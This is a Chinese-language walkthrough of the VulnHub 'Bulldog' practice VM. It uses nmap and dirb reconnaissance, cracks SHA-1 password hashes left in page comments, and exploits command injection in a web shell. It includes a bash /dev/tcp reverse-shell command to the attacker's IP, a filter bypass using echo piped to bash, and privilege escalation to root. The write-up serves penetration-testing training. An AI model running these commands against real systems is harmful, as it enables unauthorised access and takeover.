
VulnHub靶机BullDog实战

作为一名渗透测试行业的菜鸟，一直没有找到好的靶场来进行练习，最近了解到Vnluhub（www.vulnhub.com）。

## 环境配置

    *靶机难度：初学者/中级

    *目标：提权到root权限并查看flag

    *攻击机：kali linux，IP地址192.168.15.121

    *靶机：bulldog，IP地址192.168.15.129（下载地址：https://download.vulnhub.com/bulldog/bulldog.ova）

    *运行环境：kali运行在VMware中，靶机在Virtualbox中

## 信息搜集

bulldog在开机时界面上已经有一个IP地址

但还是熟悉下nmap扫描 

### 主机扫描

    nmap -sP 192.168.15.0/24

    .....
    Nmap scan report for bulldog.nthome.org (192.168.15.129)
    Host is up (0.00012s latency).
    MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)
    .....

### 信息扫描

    nmap -A 192.168.15.129

    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 13:11 EDT
    Nmap scan report for bulldog.nthome.org (192.168.15.129)
    Host is up (0.00044s latency).
    Not shown: 997 closed ports
    PORT     STATE SERVICE VERSION
    23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)
    |   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)
    |_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)
    80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
    |_http-server-header: WSGIServer/0.1 Python/2.7.12
    |_http-title: Bulldog Industries
    8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
    |_http-server-header: WSGIServer/0.1 Python/2.7.12
    |_http-title: Bulldog Industries
    MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.44 ms bulldog.nthome.org (192.168.15.129)

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds

### 查看web服务

访问此地址 bulldog.nthome.org (192.168.15.129) 看看

主要是说被黑客攻击，然后下面有个通告 Public Notice链接

打开是CEO写给客户的信，也没什么重要信息

### 爆破目录

在kali中打开命令终端，输入

    dirb http://192.168.15.129

结果如下

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Mon Aug 10 11:23:26 2020
    URL_BASE: http://192.168.15.129/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: http://192.168.15.129/ ----
    ==> DIRECTORY: http://192.168.15.129/admin/                                                                       
    ==> DIRECTORY: http://192.168.15.129/dev/                                                                         
    + http://192.168.15.129/robots.txt (CODE:200|SIZE:1071)                                                           
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/admin/ ----
    ==> DIRECTORY: http://192.168.15.129/admin/auth/                                                                  
    ==> DIRECTORY: http://192.168.15.129/admin/login/                                                                 
    ==> DIRECTORY: http://192.168.15.129/admin/logout/                                                                
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/dev/ ----
    ==> DIRECTORY: http://192.168.15.129/dev/shell/                                                                   
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/admin/auth/ ----
    ==> DIRECTORY: http://192.168.15.129/admin/auth/group/                                                            
    ==> DIRECTORY: http://192.168.15.129/admin/auth/user/                                                             
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/admin/login/ ----
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/admin/logout/ ----
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/dev/shell/ ----
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/admin/auth/group/ ----
    (!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
        (Try using FineTunning: '-f')
                                                                                                                    
    ---- Entering directory: http://192.168.15.129/admin/auth/user/ ----
    (!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
        (Try using FineTunning: '-f')
                                                                                
    -----------------
    END_TIME: Mon Aug 10 11:25:29 2020
    DOWNLOADED: 32284 - FOUND: 1

发现有两个主目录，一个是admin，一个是dev

分别查看

admin 是一个登录界面，可是我们没有用户名和密码。难道要用burp爆破一下？等会再说，而且还有dirb里扫描出的一个链接没打开，现在先看看当前页面的源代码，没啥有用的，看看扫描出的另一链接

dev 是一个因为介绍，主要说新的系统是用Django语言编写并且启用了SSH，完全删除了PHP。

页面中间有一个Web-Shell链接，点进去看下，有提示   

    Please authenticate with the server to use Web-Shell

一般来说web shell是能为我们所用的，但是现在提示与服务器进行身份验证才能使用web shell。那好吧，看看源代码

查看源代码，看到

    <p><font size="6em"><center><a href="/dev/shell" style="color:blue">Web-Shell</a></center></font></p>

        <b>Who do I talk to to get started?</b><br><br>

        <!--Need these password hashes for testing. Django's default is too complex-->
        <!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
        Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
        Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
        Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
        Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
        Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
        Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
        Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->

32位hash值，猜测是md5或者sha1，可能是前面开发人员的账号密码，找在线工具解密一下，解出两个

    ddf45997a7e18a25ad5f5cf222da64814dd060d5 -> bulldog

    d8b8dd5e7f000b8dea26ef8428caf38c04466b3e -> bulldoglover

去 admin 页面登陆试试

尝试使用用户名nick@bulldogindustries.com和sarah@bulldogindustries.com和对应的密码bulldog和bulldoglover登陆，发现登陆不了。

然后尝试使用nick和bulldog登陆，发现可以登陆。

进去之后发现都没有权限。

    You don't have permission to edit anything.

现在我们找到了两组用户名和密码，记下来可能等会要用

    nick---bulldog
    sarah---bulldoglover

想到之前那个webshell，需要认证后使用，我们登陆后查看shell页面，果然可以使用了

不过好像只能用系统给出的几个命令。先试一下有没有命令注入

### 命令注入、shell反弹

在输入框里输入 ifconfig & whoami

根据反馈结果判断存在命令注入，那接下来就好办了。

在攻击机kali中打开命令终端开始监听，输入nc -lvnp 6666

尝试bash反弹，在靶机打开的网页命令框中输入

    bash -i >& /dev/tcp/192.168.15.121/6666 0>&1

结果返回

    Command : nc -lvnp 6666

    INVALID COMMAND. I CAUGHT YOU HACKER!

换一种方式

    ls &bash -i >& /dev/tcp/192.168.15.121/6666 0>&1

服务器报错500。

多次尝试之后，使用echo命令反弹shell成功

    echo "bash -i >& /dev/tcp/192.168.15.121/6666 0>&1" | bash

接下来就是提权了

### root提权

首先查看有哪些系统用户

    cat /etc/passwd

发现了一个重点对象

    bulldogadmin

然后，查找他的文件  

    find / -user bulldogadmin 2>/dev/null

发现有hiddenadmindirectory隐藏目录，用less命令打开里面包含的文件看看

    less /home/bulldogadmin/.hiddenadmindirectory/note

同样的方式打开另一个文件查看一下

    less /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp

发现customPermissionApp里面包含的都是字符，输入命令

    strings /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp     

查看此文件


很轻松地看出文件中间有一个被 H 打断的PASSWORD单词。于是把前后字段去掉H，得到一句

    SUPERultimatePASSWORDyouCANTget   

把它保存着，这可能是我们会要用到的密码

su命令执行一下

    su: must be run from a terminal 需要一个终端

上网查了一下资料，可以用python调用本地的shell，命令：

    python -c 'import pty;pty.spawn("/bin/bash")'

然后执行命令

    sudo su -
    
输入刚才记下来的的密码试一下，结果成功获得root权限

输入ls命令，发现里面只有一个文本文档 congrats.txt

输入

    cat congrats.txt

打开看下

成功完成了Bulldog靶机实战

### 总结 

首先要爆破出admin和dev页面，利用sha-1解密得到的密码登录进系统；然后绕过bulldog的系统限制，反弹shell到kali；最后进行最重要的是root提权。